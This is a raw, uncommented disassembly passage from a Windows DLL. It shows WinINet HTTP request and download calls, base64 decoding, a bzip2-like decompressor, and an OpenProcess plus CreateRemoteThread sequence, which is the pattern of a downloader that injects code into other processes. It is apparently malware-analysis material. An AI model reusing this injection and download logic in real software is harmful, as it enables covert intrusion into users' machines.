and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
test esi esi
sete al
movzx eax al
push eax
call sub_1000a264
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_1000197b
mov eax esi
call sub_100142eb
retn
sub_1000c649
push 0x28
mov eax sub_100276cd
call sub_10014213
mov esi ecx
mov eax [ ebp + 0xc ]
call sub_1000cbae
mov ebx eax
mov eax [ ebp + 0x10 ]
call sub_1000cbae
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x14 ]
call sub_1000cbae
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x18 ]
call sub_1000cbae
cmp [ esi + 0x18 ] 0x8
jb r-xdata
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x4 ]
push 0x0
push 0x0
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x14 ]
push esi
push ebx
push ecx
call [ HttpOpenRequestW@IAT ]
push r--data
lea ecx [ ebp - 0x30 ]
mov esi eax
call sub_100016bc
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x30 ]
push eax
test esi esi
sete al
movzx eax al
push eax
call sub_1000a264
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_1000197b
mov eax esi
call sub_100142eb
retn
sub_1000c6e2
push 0x20
mov eax sub_100279d9
call sub_10014213
mov esi ecx
mov eax esi
call sub_1000cbae
push [ ebp + 0x10 ]
mov esi [ esi + 0x14 ]
push [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x4 ]
push esi
push eax
push ecx
call [ HttpSendRequestW@IAT ]
push r--data
lea ecx [ ebp - 0x28 ]
mov esi eax
call sub_100016bc
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
cmp esi 0x1
setne al
movzx eax al
push eax
call sub_1000a264
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_1000197b
call sub_100142eb
retn 0xc
sub_1000c74b
push 0x20
mov eax sub_1002733c
call sub_10014213
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and [ ebp - 0x10 ] 0x0
lea ecx [ ebp - 0x10 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call [ InternetReadFile@IAT ]
push r--data
lea ecx [ ebp - 0x2c ]
mov edi eax
call sub_100016bc
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x2c ]
push eax
cmp edi 0x1
setne al
movzx eax al
push eax
call sub_1000a264
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1000197b
mov eax [ ebp - 0x10 ]
call sub_100142eb
retn 0xc
sub_1000c7fd
push 0x4c
mov eax sub_100276aa
call sub_10014213
mov eax [ ebp + 0xc ]
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x1c ] ebx
cmp [ eax + 0x18 ] 0x10
mov ecx [ eax + 0x14 ]
mov [ ebp - 0x18 ] ebx
jb r-xdata
add eax 0x4
mov [ ebp - 0x14 ] eax
add eax 0x4
mov [ ebp - 0x14 ] eax
mov eax [ eax ]
jmp r-xdata
mov [ ebp - 0x10 ] ebx
mov esi [ ebp - 0x18 ]
add eax 0x4
call sub_100047b7
mov eax [ ebp - 0x10 ]
mov [ eax ] r--data
mov [ ebp - 0x10 ] eax
jmp r-xdata
push ebx
push ebx
lea edx [ ebp - 0x18 ]
push edx
push ebx
xor edi edi
inc edi
push edi
push ecx
push eax
call [ CryptStringToBinaryA@IAT ]
push r--data
lea ecx [ ebp - 0x38 ]
mov esi eax
call sub_100016bc
lea eax [ ebp - 0x38 ]
push eax
cmp esi edi
setne al
movzx eax al
push eax
mov [ ebp - 0x4 ] edi
call sub_1000a264
pop ecx
pop ecx
push ebx
push edi
lea ecx [ ebp - 0x38 ]
mov [ ebp - 0x4 ] bl
call sub_1000197b
push 0x20
call sub_10010c96
pop ecx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x2
cmp eax ebx
je r-xdata
add eax 0x8
mov eax [ eax + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] bl
mov eax [ ebp - 0x10 ]
mov esi [ ebp + 0x8 ]
push eax
lea ecx [ esi + 0x4 ]
mov [ esi ] eax
call sub_1000bcac
push [ ebp - 0x10 ]
push [ ebp - 0x10 ]
push esi
call sub_1000102d
add esp 0xc
mov [ ebp - 0x4 ] ebx
mov eax [ esi ]
cmp [ eax + 0x1c ] 0x10
mov [ ebp - 0x1c ] edi
jb r-xdata
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp [ ecx + 0x18 ] 0x10
mov edx [ ecx + 0x14 ]
mov [ ebp - 0x10 ] eax
jb r-xdata
push ebx
push ebx
lea eax [ ebp - 0x18 ]
push eax
push [ ebp - 0x10 ]
push edi
push edx
push ecx
call [ CryptStringToBinaryA@IAT ]
push r--data
lea ecx [ ebp - 0x54 ]
mov [ ebp + 0xc ] eax
call sub_100016bc
cmp [ ebp + 0xc ] edi
lea eax [ ebp - 0x54 ]
push eax
setne al
movzx eax al
push eax
mov [ ebp - 0x4 ] 0x3
call sub_1000a264
pop ecx
pop ecx
push ebx
push edi
lea ecx [ ebp - 0x54 ]
call sub_1000197b
mov eax esi
call sub_100142eb
retn
sub_1000c966
push 0x24
mov eax sub_1002765c
call sub_10014213
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ esi ] r--data
call sub_100142eb
retn
push eax
call [ FreeLibrary@IAT ]
push r--data
lea ecx [ ebp - 0x2c ]
mov ebx eax
call sub_100016bc
lea eax [ ebp - 0x2c ]
push eax
test ebx ebx
sete al
movzx eax al
push eax
mov [ ebp - 0x4 ] 0x1
call sub_1000a264
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1000197b
and [ esi + 0x4 ] 0x0
sub_1000c9d2
push 0x30
mov eax sub_10027769
call sub_10014213
lea eax [ ebp - 0x14 ]
push eax
xor esi esi
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push esi
push [ ebp + 0x8 ]
call [ CreateRemoteThread@IAT ]
push r--data
lea ecx [ ebp - 0x3c ]
mov [ ebp - 0x18 ] eax
call sub_100016bc
mov [ ebp - 0x4 ] esi
cmp [ ebp - 0x18 ] esi
lea eax [ ebp - 0x3c ]
push eax
sete al
movzx eax al
push eax
call sub_1000a264
or [ ebp - 0x4 ] 0xffffffff
pop ecx
pop ecx
push esi
push 0x1
lea ecx [ ebp - 0x3c ]
call sub_1000197b
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
push edi
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x1c ] eax
call sub_1000a2f5
mov [ edi ] r--data
mov eax edi
call sub_100142eb
retn 0xc
sub_1000ca52
push 0x20
mov eax sub_1002733c
call sub_10014213
push [ ebp + 0x8 ]
xor esi esi
push esi
push 0x2a
mov [ ebp - 0x10 ] esi
call [ OpenProcess@IAT ]
push r--data
lea ecx [ ebp - 0x2c ]
mov edi eax
call sub_100016bc
lea eax [ ebp - 0x2c ]
push eax
cmp edi esi
sete al
movzx eax al
push eax
mov [ ebp - 0x4 ] esi
call sub_1000a264
or [ ebp - 0x4 ] 0xffffffff
pop ecx
pop ecx
push esi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1000197b
push 0x8
call sub_10010c96
pop ecx
cmp eax esi
je r-xdata
push esi
lea ecx [ ebx + 0x4 ]
mov [ ebx ] esi
call sub_1000cadf
push esi
push esi
push ebx
call sub_1000102d
add esp 0xc
mov eax ebx
call sub_100142eb
retn
mov [ eax ] r--data
mov [ eax + 0x4 ] edi
mov [ eax ] r--data
mov esi eax
sub_1000cadf
push 0x4
mov eax sub_10026acc
call sub_10014246
mov esi ecx
and [ esi ] 0x0
and [ ebp - 0x4 ] 0x0
push 0x10
call sub_10010c96
pop ecx
test eax eax
je r-xdata
xor eax eax
xor ecx ecx
inc ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0xc ] ecx
jmp r-xdata
mov [ esi ] eax
mov eax esi
call sub_100142eb
retn 0x4
sub_1000cb3c
push 0x44
mov eax sub_10026d8e
call sub_10014213
push r--data
lea ecx [ ebp - 0x28 ]
call sub_100016bc
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x50 ]
push eax
call sub_100083d8
push r--data
lea eax [ ebp - 0x50 ]
push eax
call sub_10013de1
int3
sub_1000cbae
push ebx
mov ebx eax
call sub_1000bc89
test al al
je r-xdata
cmp [ ebx + 0x18 ] 0x8
jb r-xdata
xor eax eax
pop ebx
retn
lea eax [ ebx + 0x4 ]
pop ebx
retn
mov eax [ ebx + 0x4 ]
pop ebx
retn
sub_1000cc18
push ebx
xor ebx ebx
cmp esi ebx
jne r-xdata
cmp [ esi + 0x24 ] ebx
jne r-xdata
push 0xfffffffe
cmp [ esi + 0x28 ] ebx
jne r-xdata
mov [ esi + 0x24 ] sub_1000cbf5
push 0x1
push 0xfa74
push [ esi + 0x2c ]
call [ esi + 0x24 ]
add esp 0xc
cmp eax ebx
jne r-xdata
mov [ esi + 0x28 ] sub_1000cc06
mov [ eax ] esi
mov [ esi + 0x20 ] eax
mov [ eax + 0x20 ] ebx
mov [ eax + 0x1c ] ebx
mov [ eax + 0xc64 ] ebx
mov [ eax + 0x4 ] 0xa
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ esi + 0x18 ] ebx
mov [ esi + 0x1c ] ebx
mov [ eax + 0x28 ] bl
mov [ eax + 0xc54 ] ebx
mov [ eax + 0xc50 ] ebx
mov [ eax + 0xc4c ] ebx
mov [ eax + 0x2c ] ebx
mov [ eax + 0x30 ] ebx
xor eax eax
pop ebx
retn
push 0xfffffffd
jmp r-xdata
pop eax
pop ebx
retn
sub_1000cc97
push ebp
mov ebp esp
sub esp 0x28
cmp [ ecx + 0x10 ] 0x0
push ebx
push esi
push edi
je r-xdata
mov eax [ ecx + 0xc60 ]
mov ebx [ ecx + 0xc4c ]
mov esi [ ecx + 0xc ]
mov edx [ ecx + 0x38 ]
mov [ ebp - 0x14 ] eax
mov al [ ecx + 0x8 ]
mov [ ebp - 0x1 ] al
mov eax [ ecx + 0x440 ]
mov [ ebp - 0x8 ] eax
mov eax [ ecx + 0x3c ]
mov [ ebp - 0xc ] eax
mov eax [ ecx ]
mov edi [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x18 ] edi
mov edi [ ecx + 0x24 ]
mov [ ebp - 0x24 ] edi
mov edi [ ecx + 0xfa40 ]
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x28 ] eax
inc edi
mov edx [ ecx ]
xor edi edi
cmp [ edx + 0x14 ] edi
je r-xdata
cmp [ ebp - 0x8 ] edi
jg r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor al al
jmp r-xdata
cmp [ ecx + 0xc ] edi
je r-xdata
mov al 0x1
je r-xdata
mov eax [ ecx ]
mov edi [ eax + 0x18 ]
mov [ ebp - 0x24 ] edi
sub edi [ ebp - 0x10 ]
add edi [ ebp - 0x28 ]
mov [ eax + 0x18 ] edi
mov eax [ ecx ]
mov edi [ ebp - 0x24 ]
cmp [ eax + 0x18 ] edi
jae r-xdata
cmp esi 0x1
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ecx + 0xfa40 ]
mov esi [ ecx + 0x440 ]
inc eax
mov [ ebp - 0x18 ] eax
cmp esi eax
je r-xdata
mov eax [ edx + 0x10 ]
mov dl [ ecx + 0x8 ]
mov [ eax ] dl
movzx ebx [ ecx + 0x8 ]
lea esi [ ecx + 0xc60 ]
mov edx [ esi ]
mov eax edx
shl edx 0x8
shr eax 0x18
xor eax ebx
xor edx [ eax * 4 + rw-data ]
dec [ ecx + 0xc ]
mov [ esi ] edx
mov edx [ ecx ]
inc [ edx + 0x10 ]
mov edx [ ecx ]
dec [ edx + 0x14 ]
mov edx [ ecx ]
inc [ edx + 0x18 ]
mov edx [ ecx ]
cmp [ edx + 0x18 ] edi
jne r-xdata
xor esi esi
jmp r-xdata
mov al [ ebp - 0xc ]
mov [ ebp - 0x1 ] al
mov eax [ ebp - 0x24 ]
imul eax eax 0x186a0
cmp edx eax
jae r-xdata
mov eax [ ebp - 0x14 ]
mov [ ecx + 0xc60 ] eax
mov al [ ebp - 0x1 ]
mov [ ecx + 0x8 ] al
mov eax [ ebp - 0x8 ]
mov [ ecx + 0x440 ] eax
mov eax [ ebp - 0xc ]
mov [ ecx + 0x3c ] eax
mov eax [ ecx ]
mov [ ecx + 0x38 ] edx
mov edx [ ebp - 0x18 ]
mov [ ecx + 0xc ] esi
mov [ ecx + 0xc4c ] ebx
mov [ eax + 0x10 ] edx
mov eax [ ecx ]
mov ecx [ ebp - 0x10 ]
mov [ eax + 0x14 ] ecx
inc [ eax + 0x1c ]
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov ebx [ ebp - 0x18 ]
mov al [ ebp - 0x1 ]
mov [ ebx ] al
mov ebx [ ebp - 0x14 ]
movzx eax al
shr ebx 0x18
xor ebx eax
mov eax [ ebp - 0x14 ]
shl eax 0x8
xor eax [ ebx * 4 + rw-data ]
mov ebx [ ebp - 0x1c ]
dec esi
inc [ ebp - 0x18 ]
dec [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
jg r-xdata
inc [ edx + 0x1c ]
jmp r-xdata
mov edx [ ebx + edx * 4 ]
mov al dl
movzx eax al
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0xc ]
shr edx 0x8
inc [ ebp - 0x8 ]
cmp [ ebp - 0x20 ] eax
je r-xdata
xor esi esi
inc esi
mov esi [ ebp - 0x18 ]
mov al [ ebp - 0x1 ]
mov [ esi ] al
mov esi [ ebp - 0x14 ]
movzx eax al
shr esi 0x18
xor esi eax
mov eax [ ebp - 0x14 ]
shl eax 0x8
xor eax [ esi * 4 + rw-data ]
inc [ ebp - 0x18 ]
dec [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov al [ ecx + 0x3c ]
mov edx [ ecx + 0x38 ]
mov [ ecx + 0x8 ] al
mov eax [ ecx + 0x24 ]
imul eax eax 0x186a0
mov [ ecx + 0xc ] 0x1
mov [ ebp - 0x1c ] eax
cmp edx eax
jae r-xdata
cmp [ ebp - 0x8 ] edi
jne r-xdata
mov eax [ ebp - 0x20 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov ebx [ ecx + 0xc4c ]
mov edx [ ebx + edx * 4 ]
mov al dl
shr edx 0x8
mov [ ecx + 0x38 ] edx
cmp [ ecx + 0x14 ] edi
jne r-xdata
mov eax [ ebp - 0x24 ]
imul eax eax 0x186a0
push 0x2
pop esi
mov [ ebp - 0x20 ] eax
cmp edx eax
jae r-xdata
dec [ ecx + 0x14 ]
mov edi [ ecx + 0x14 ]
cmp edi 0x1
sete dl
xor al dl
inc esi
mov [ ecx + 0x440 ] esi
cmp esi [ ebp - 0x18 ]
je r-xdata
mov edx [ ecx + 0x18 ]
mov edi [ edx * 4 + rw-data ]
inc edx
mov [ ecx + 0x14 ] edi
mov [ ecx + 0x18 ] edx
cmp edx 0x200
jne r-xdata
mov edx [ ebx + edx * 4 ]
mov [ ebp - 0x2 ] dl
shr edx 0x8
inc [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] edi
je r-xdata
movzx eax al
cmp eax [ ecx + 0x3c ]
jne r-xdata
and [ ecx + 0x18 ] 0x0
test esi esi
jle r-xdata
movzx eax [ ebp - 0x2 ]
cmp eax [ ebp - 0xc ]
je r-xdata
mov [ ecx + 0x3c ] eax
jmp r-xdata
mov eax [ ecx + 0x38 ]
mov [ ecx + 0xc ] 0x2
cmp eax [ ebp - 0x1c ]
jae r-xdata
push 0x3
pop esi
cmp edx [ ebp - 0x20 ]
jae r-xdata
mov ebx [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov edx [ ebx + eax * 4 ]
mov al dl
shr edx 0x8
mov [ ecx + 0x38 ] edx
test edi edi
jne r-xdata
mov ebx [ ebp - 0x1c ]
mov edx [ ebx + edx * 4 ]
mov [ ebp - 0x2 ] dl
shr edx 0x8
inc [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] edi
je r-xdata
dec [ ecx + 0x14 ]
mov edi [ ecx + 0x14 ]
cmp edi 0x1
sete dl
xor al dl
inc esi
mov [ ecx + 0x440 ] esi
cmp esi [ ebp - 0x18 ]
je r-xdata
mov edx [ ecx + 0x18 ]
mov edi [ edx * 4 + rw-data ]
inc edx
mov [ ecx + 0x14 ] edi
mov [ ecx + 0x18 ] edx
cmp edx 0x200
jne r-xdata
movzx eax [ ebp - 0x2 ]
cmp eax [ ebp - 0xc ]
je r-xdata
movzx eax al
cmp eax [ ecx + 0x3c ]
jne r-xdata
and [ ecx + 0x18 ] 0x0
cmp edx [ ebp - 0x20 ]
jae r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ecx + 0x38 ]
mov [ ecx + 0xc ] 0x3
cmp eax [ ebp - 0x1c ]
jae r-xdata
mov edx [ ebx + edx * 4 ]
mov al dl
movzx esi al
shr edx 0x8
add esi 0x4
cmp edx [ ebp - 0x20 ]
jae r-xdata
mov edx [ ebx + eax * 4 ]
mov al dl
shr edx 0x8
mov [ ecx + 0x38 ] edx
test edi edi
jne r-xdata
mov edx [ ebx + edx * 4 ]
movzx eax dl
shr edx 0x8
add [ ebp - 0x8 ] 0x2
mov [ ebp - 0xc ] eax
jmp r-xdata
dec [ ecx + 0x14 ]
mov edi [ ecx + 0x14 ]
cmp edi 0x1
sete dl
xor al dl
inc esi
mov [ ecx + 0x440 ] esi
cmp esi [ ebp - 0x18 ]
je r-xdata
mov edx [ ecx + 0x18 ]
mov edi [ edx * 4 + rw-data ]
inc edx
mov [ ecx + 0x14 ] edi
mov [ ecx + 0x18 ] edx
cmp edx 0x200
jne r-xdata
movzx eax al
cmp eax [ ecx + 0x3c ]
je r-xdata
and [ ecx + 0x18 ] 0x0
mov eax [ ecx + 0x38 ]
cmp eax [ ebp - 0x1c ]
jae r-xdata
mov edx [ ebx + eax * 4 ]
mov al dl
shr edx 0x8
mov [ ecx + 0x38 ] edx
test edi edi
jne r-xdata
dec [ ecx + 0x14 ]
mov edi [ ecx + 0x14 ]
xor edx edx
inc esi
cmp edi 0x1
sete dl
movzx eax al
mov [ ecx + 0x440 ] esi
xor edx eax
add edx 0x4
mov [ ecx + 0xc ] edx
mov edx [ ecx + 0x38 ]
cmp edx [ ebp - 0x1c ]
jae r-xdata
mov edx [ ecx + 0x18 ]
mov edi [ edx * 4 + rw-data ]
inc edx
mov [ ecx + 0x14 ] edi
mov [ ecx + 0x18 ] edx
cmp edx 0x200
jne r-xdata
mov eax [ ebx + edx * 4 ]
mov [ ecx + 0x38 ] eax
shr [ ecx + 0x38 ] 0x8
movzx eax al
mov [ ecx + 0x3c ] eax
test edi edi
jne r-xdata
and [ ecx + 0x18 ] 0x0
dec [ ecx + 0x14 ]
mov eax [ ecx + 0x14 ]
xor edx edx
cmp eax 0x1
sete dl
xor [ ecx + 0x3c ] edx
inc esi
mov [ ecx + 0x440 ] esi
jmp r-xdata
mov eax [ ecx + 0x18 ]
mov edx [ eax * 4 + rw-data ]
inc eax
mov [ ecx + 0x14 ] edx
mov [ ecx + 0x18 ] eax
cmp eax 0x200
jne r-xdata
and [ ecx + 0x18 ] edi
sub_1000d143
push esi
xor eax eax
mov edx 0x100
push edi
mov edx ecx
mov eax ecx
jmp r-xdata
mov esi [ esp + 0xc ]
mov edi [ esp + 0x10 ]
lea ecx [ edx + eax ]
sar ecx 0x1
cmp esi [ edi + ecx * 4 ]
jl r-xdata
pop edi
pop esi
retn
mov ecx edx
sub ecx eax
cmp ecx 0x1
jne r-xdata
sub_1000d170
push ebp
mov ebp esp
sub esp 0x10
cmp [ esi + 0x10 ] 0x0
push ebx
push edi
je r-xdata
mov eax [ esi ]
xor edx edx
cmp [ eax + 0x14 ] edx
je r-xdata
mov eax [ esi ]
xor edx edx
cmp [ eax + 0x14 ] edx
je r-xdata
xor al al
jmp r-xdata
cmp [ esi + 0xc ] edx
je r-xdata
cmp [ esi + 0xc ] edx
je r-xdata
pop edi
pop ebx
leave
retn
mov eax [ esi + 0xfa40 ]
mov ecx [ esi + 0x440 ]
inc eax
mov [ ebp - 0xc ] eax
cmp ecx eax
je r-xdata
mov eax [ eax + 0x10 ]
mov cl [ esi + 0x8 ]
mov [ eax ] cl
movzx ebx [ esi + 0x8 ]
lea ecx [ esi + 0xc60 ]
mov eax [ ecx ]
mov edi eax
shl eax 0x8
shr edi 0x18
xor edi ebx
xor eax [ edi * 4 + rw-data ]
dec [ esi + 0xc ]
mov [ ecx ] eax
mov eax [ esi ]
inc [ eax + 0x10 ]
mov eax [ esi ]
dec [ eax + 0x14 ]
mov eax [ esi ]
inc [ eax + 0x18 ]
mov eax [ esi ]
cmp [ eax + 0x18 ] edx
jne r-xdata
mov eax [ esi + 0xfa40 ]
mov ecx [ esi + 0x440 ]
inc eax
mov [ ebp - 0xc ] eax
cmp ecx eax
je r-xdata
mov eax [ eax + 0x10 ]
mov cl [ esi + 0x8 ]
mov [ eax ] cl
movzx ebx [ esi + 0x8 ]
lea ecx [ esi + 0xc60 ]
mov eax [ ecx ]
mov edi eax
shl eax 0x8
shr edi 0x18
xor edi ebx
xor eax [ edi * 4 + rw-data ]
dec [ esi + 0xc ]
mov [ ecx ] eax
mov eax [ esi ]
inc [ eax + 0x10 ]
mov eax [ esi ]
dec [ eax + 0x14 ]
mov eax [ esi ]
inc [ eax + 0x18 ]
mov eax [ esi ]
cmp [ eax + 0x18 ] edx
jne r-xdata
jg r-xdata
inc [ eax + 0x1c ]
jmp r-xdata
jg r-xdata
inc [ eax + 0x1c ]
jmp r-xdata
mov al 0x1
mov al [ esi + 0x3c ]
mov ecx [ esi + 0x38 ]
mov [ esi + 0x8 ] al
mov eax [ esi + 0x24 ]
imul eax eax 0x186a0
mov [ esi + 0xc ] 0x1
mov [ ebp - 0x8 ] eax
cmp ecx eax
jae r-xdata
mov al [ esi + 0x3c ]
mov ecx [ esi + 0x38 ]
mov [ esi + 0x8 ] al
mov eax [ esi + 0x24 ]
imul eax eax 0x186a0
mov [ esi + 0xc ] 0x1
mov [ ebp - 0x8 ] eax
cmp ecx eax
jae r-xdata
lea eax [ esi + 0x444 ]
push eax
push ecx
call sub_1000d143
mov edx [ esi + 0x38 ]
mov edi [ esi + 0xc54 ]
mov ebx [ esi + 0xc50 ]
mov [ ebp - 0x1 ] al
pop ecx
pop ecx
movzx ecx dl
mov eax edx
shr eax 0x1
movzx eax [ eax + edi ]
and cl 0x1
shl cl 0x2
shr eax cl
movzx ecx [ ebx + edx * 2 ]
and eax 0xf
shl eax 0x10
or eax ecx
mov [ esi + 0x38 ] eax
mov eax [ esi + 0x440 ]
lea ecx [ eax + 0x1 ]
mov [ ebp - 0x10 ] ecx
mov [ esi + 0x440 ] ecx
cmp ecx [ ebp - 0xc ]
je r-xdata
lea eax [ esi + 0x444 ]
push eax
push ecx
call sub_1000d143
mov edx [ esi + 0x38 ]
mov edi [ esi + 0xc54 ]
mov ebx [ esi + 0xc50 ]
mov [ ebp - 0x1 ] al
pop ecx
pop ecx
movzx ecx dl
mov eax edx
shr eax 0x1
movzx eax [ eax + edi ]
and cl 0x1
shl cl 0x2
shr eax cl
movzx ecx [ ebx + edx * 2 ]
and eax 0xf
shl eax 0x10
or eax ecx
cmp [ esi + 0x14 ] 0x0
mov [ esi + 0x38 ] eax
jne r-xdata
movzx eax [ ebp - 0x1 ]
cmp eax [ esi + 0x3c ]
jne r-xdata
dec [ esi + 0x14 ]
cmp [ esi + 0x14 ] 0x1
sete al
xor [ ebp - 0x1 ] al
mov eax [ esi + 0x440 ]
inc eax
mov [ ebp - 0x10 ] eax
mov [ esi + 0x440 ] eax
cmp eax [ ebp - 0xc ]
je r-xdata
mov eax [ esi + 0x18 ]
mov ecx [ eax * 4 + rw-data ]
inc eax
mov [ esi + 0x14 ] ecx
mov [ esi + 0x18 ] eax
cmp eax 0x200
jne r-xdata
mov [ esi + 0x3c ] eax
jmp r-xdata
mov ecx [ esi + 0x38 ]
mov [ esi + 0xc ] 0x2
cmp ecx [ ebp - 0x8 ]
jae r-xdata
movzx eax [ ebp - 0x1 ]
cmp eax [ esi + 0x3c ]
jne r-xdata
and [ esi + 0x18 ] 0x0
lea eax [ esi + 0x444 ]
push eax
push ecx
call sub_1000d143
mov edx [ esi + 0x38 ]
mov [ ebp - 0x1 ] al
pop ecx
pop ecx
movzx ecx dl
mov eax edx
shr eax 0x1
movzx eax [ eax + edi ]
and cl 0x1
shl cl 0x2
shr eax cl
movzx ecx [ ebx + edx * 2 ]
and eax 0xf
shl eax 0x10
or eax ecx
mov ecx [ ebp - 0x10 ]
inc ecx
mov [ esi + 0x38 ] eax
mov [ ebp - 0x10 ] ecx
mov [ esi + 0x440 ] ecx
cmp ecx [ ebp - 0xc ]
je r-xdata
mov [ esi + 0x3c ] eax
jmp r-xdata
mov ecx [ esi + 0x38 ]
mov [ esi + 0xc ] 0x2
cmp ecx [ ebp - 0x8 ]
jae r-xdata
movzx eax [ ebp - 0x1 ]
cmp eax [ esi + 0x3c ]
jne r-xdata
lea eax [ esi + 0x444 ]
push eax
push ecx
call sub_1000d143
mov edx [ esi + 0x38 ]
mov [ ebp - 0x1 ] al
pop ecx
pop ecx
movzx ecx dl
mov eax edx
shr eax 0x1
movzx eax [ eax + edi ]
and cl 0x1
shl cl 0x2
shr eax cl
movzx ecx [ ebx + edx * 2 ]
and eax 0xf
shl eax 0x10
or eax ecx
cmp [ esi + 0x14 ] 0x0
mov [ esi + 0x38 ] eax
jne r-xdata
mov ecx [ esi + 0x38 ]
mov [ esi + 0xc ] 0x3
cmp ecx [ ebp - 0x8 ]
jae r-xdata
dec [ esi + 0x14 ]
cmp [ esi + 0x14 ] 0x1
sete al
xor [ ebp - 0x1 ] al
mov eax [ ebp - 0x10 ]
inc eax
mov [ ebp - 0x10 ] eax
mov [ esi + 0x440 ] eax
cmp eax [ ebp - 0xc ]
je r-xdata
mov eax [ esi + 0x18 ]
mov ecx [ eax * 4 + rw-data ]
inc eax
mov [ esi + 0x14 ] ecx
mov [ esi + 0x18 ] eax
cmp eax 0x200
jne r-xdata
lea eax [ esi + 0x444 ]
push eax
push ecx
call sub_1000d143
mov edx [ esi + 0x38 ]
mov [ ebp - 0x1 ] al
pop ecx
pop ecx
movzx ecx dl
mov eax edx
shr eax 0x1
movzx eax [ eax + edi ]
and cl 0x1
shl cl 0x2
shr eax cl
movzx ecx [ ebx + edx * 2 ]
and eax 0xf
shl eax 0x10
or eax ecx
mov ecx [ ebp - 0x10 ]
inc ecx
mov [ esi + 0x38 ] eax
mov [ ebp - 0x10 ] ecx
mov [ esi + 0x440 ] ecx
cmp ecx [ ebp - 0xc ]
je r-xdata
movzx eax [ ebp - 0x1 ]
cmp eax [ esi + 0x3c ]
jne r-xdata
and [ esi + 0x18 ] 0x0
movzx eax [ ebp - 0x1 ]
cmp eax [ esi + 0x3c ]
je r-xdata
mov ecx [ esi + 0x38 ]
mov [ esi + 0xc ] 0x3
cmp ecx [ ebp - 0x8 ]
jae r-xdata
mov ecx [ esi + 0x38 ]
cmp ecx [ ebp - 0x8 ]
jae r-xdata
lea eax [ esi + 0x444 ]
push eax
push ecx
call sub_1000d143
mov edx [ esi + 0x38 ]
mov [ ebp - 0x1 ] al
pop ecx
pop ecx
movzx ecx dl
mov eax edx
shr eax 0x1
movzx eax [ eax + edi ]
and cl 0x1
shl cl 0x2
shr eax cl
movzx ecx [ ebx + edx * 2 ]
and eax 0xf
shl eax 0x10
or eax ecx
cmp [ esi + 0x14 ] 0x0
mov [ esi + 0x38 ] eax
jne r-xdata
lea eax [ esi + 0x444 ]
push eax
push ecx
call sub_1000d143
mov edx [ esi + 0x38 ]
mov [ ebp - 0x1 ] al
pop ecx
pop ecx
movzx ecx dl
mov eax edx
shr eax 0x1
movzx eax [ eax + edi ]
and cl 0x1
shl cl 0x2
shr eax cl
movzx ecx [ ebx + edx * 2 ]
and eax 0xf
shl eax 0x10
or eax ecx
mov [ esi + 0x38 ] eax
mov eax [ ebp - 0x10 ]
inc eax
mov [ ebp - 0x10 ] eax
mov [ esi + 0x440 ] eax
movzx eax [ ebp - 0x1 ]
add eax 0x4
mov [ esi + 0xc ] eax
mov eax [ esi + 0x38 ]
cmp eax [ ebp - 0x8 ]
jae r-xdata
dec [ esi + 0x14 ]
cmp [ esi + 0x14 ] 0x1
sete al
xor [ ebp - 0x1 ] al
mov eax [ ebp - 0x10 ]
inc eax
mov [ ebp - 0x10 ] eax
mov [ esi + 0x440 ] eax
cmp eax [ ebp - 0xc ]
je r-xdata
mov eax [ esi + 0x18 ]
mov ecx [ eax * 4 + rw-data ]
inc eax
mov [ esi + 0x14 ] ecx
mov [ esi + 0x18 ] eax
cmp eax 0x200
jne r-xdata
lea ecx [ esi + 0x444 ]
push ecx
push eax
call sub_1000d143
